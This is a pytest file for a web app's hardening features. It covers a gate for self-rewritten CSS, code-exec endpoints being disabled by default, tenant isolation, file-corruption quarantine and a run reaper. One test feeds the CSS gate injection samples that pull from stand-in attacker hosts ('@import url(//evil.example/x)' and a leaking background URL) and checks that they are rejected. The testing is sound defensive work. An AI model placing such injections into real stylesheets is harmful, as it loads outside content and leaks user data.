"""Tests for the council-hardening pass: self-improve gate, foundry gating,
portfolio durability, tenant isolation, erasure, run reaper, shared helpers."""

import json
import os
import tempfile

import pytest

_TMP = tempfile.mkdtemp(prefix="graphos-hard-")
os.environ["GRAPHOS_DISABLE_LIVE"] = "1"
os.environ.setdefault("GRAPHOS_DB_PATH", os.path.join(_TMP, "hard.db"))
os.environ["GRAPHOS_TELEMETRY_DIR"] = os.path.join(_TMP, "telemetry")
os.environ["GRAPHOS_EXECUTION_LOG"] = os.path.join(_TMP, "log.md")

from fastapi.testclient import TestClient  # noqa: E402

from graphos import foundry_api, self_improve  # noqa: E402
from graphos.app import app  # noqa: E402
from graphos.config import settings  # noqa: E402
from graphos.llm_parse import extract_json, strip_fence  # noqa: E402
from graphos.store import Store  # noqa: E402


@pytest.fixture
def client():
    with TestClient(app) as c:
        yield c


# -- self-improve gate (the self-modifying safety net) --------------------
_CSS = ".app{color:#fff}\n.nav{padding:4px}\n.view{margin:0}\n"


def test_gate_accepts_recolour_same_structure():
    assert self_improve._gate(_CSS, ".app{color:#eee}\n.nav{padding:6px}\n.view{margin:0}\n") == {}


def test_gate_rejects_dropped_selector():
    bad = ".app{color:#eee}\n.view{margin:0}\n"  # lost .nav
    assert self_improve._gate(_CSS, bad).get("applied") is False


def test_gate_rejects_unbalanced_and_truncation():
    assert self_improve._gate(_CSS, ".app{color:#eee").get("applied") is False
    assert self_improve._gate(_CSS, ".a{}").get("applied") is False  # too short


def test_gate_rejects_injection():
    evil = _CSS + "\n@import url(//evil.example/x);"
    r = self_improve._gate(_CSS, evil)
    assert r.get("applied") is False and "injection" in r["reason"]
    evil2 = _CSS + "\n.x{background:url('//evil/leak?a')}"
    assert self_improve._gate(_CSS, evil2).get("applied") is False


# -- foundry code-exec endpoints are OFF by default -----------------------
def test_foundry_disabled_by_default(client):
    assert settings.enable_foundry is False
    assert client.post("/api/foundry/propose", json={"goal": "pack bins tightly"}).status_code == 403
    assert client.post("/api/foundry/self-improve").status_code == 403


def test_propose_503_when_enabled_but_no_model(client, monkeypatch):
    monkeypatch.setattr(settings, "enable_foundry", True)
    # live disabled -> backend None -> 503 (not a crash)
    assert client.post("/api/foundry/propose", json={"goal": "pack bins tightly"}).status_code == 503


# -- portfolio durability -------------------------------------------------
def test_portfolio_roundtrip_and_corruption_is_quarantined(client, monkeypatch, tmp_path):
    monkeypatch.setattr(foundry_api, "_PORTFOLIO", tmp_path / "pf.json")
    spec = {"engine": "x", "task": "route_planner", "fitness": 0.7, "genome": [0.1, 0.2]}
    assert client.post("/api/foundry/portfolio", json=spec).json()["saved"] is True
    # corrupt the file, then another ship must NOT destroy it silently
    (tmp_path / "pf.json").write_text("{not json", encoding="utf-8")
    r = client.post("/api/foundry/portfolio", json=spec).json()
    assert r["saved"] is True
    assert any(p.name.startswith("pf.corrupt-") or "corrupt" in p.name for p in tmp_path.iterdir())


# -- tenant isolation + erasure ------------------------------------------
def test_tenant_isolation_and_delete(client):
    a = client.post("/api/sessions", json={"title": "A"}, headers={"X-Tenant-Id": "tenant-a"}).json()
    client.post("/api/sessions", json={"title": "B"}, headers={"X-Tenant-Id": "tenant-b"})
    # B cannot see A's session or enumerate it
    b_list = client.get("/api/sessions", headers={"X-Tenant-Id": "tenant-b"}).json()["sessions"]
    assert all(s["id"] != a["id"] for s in b_list)
    assert client.get(f"/api/sessions/{a['id']}", headers={"X-Tenant-Id": "tenant-b"}).status_code == 404
    # owner can delete (erasure)
    assert client.delete(f"/api/sessions/{a['id']}", headers={"X-Tenant-Id": "tenant-a"}).status_code == 200
    assert client.get(f"/api/sessions/{a['id']}", headers={"X-Tenant-Id": "tenant-a"}).status_code == 404


# -- store reaper ---------------------------------------------------------
def test_reaper_fails_orphaned_runs(tmp_path):
    s = Store(tmp_path / "r.db")
    sess = s.create_session("x")
    rid = s.create_run(sess["id"], "topic", {})
    s.start_run(rid)  # now 'running'
    assert s.reap_orphan_runs() >= 1
    assert s.get_run(rid)["status"] == "failed"


# -- shared helpers --------------------------------------------------------
def test_llm_parse_helpers():
    assert extract_json('noise {"a":1} tail')["a"] == 1
    assert extract_json("no json here") is None
    assert strip_fence("```json\n{\"a\":1}\n```") == '{"a":1}'


def test_health_ready_and_live(client):
    assert client.get("/api/health/live").json()["status"] == "alive"
    assert client.get("/api/health/ready").status_code == 200


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))
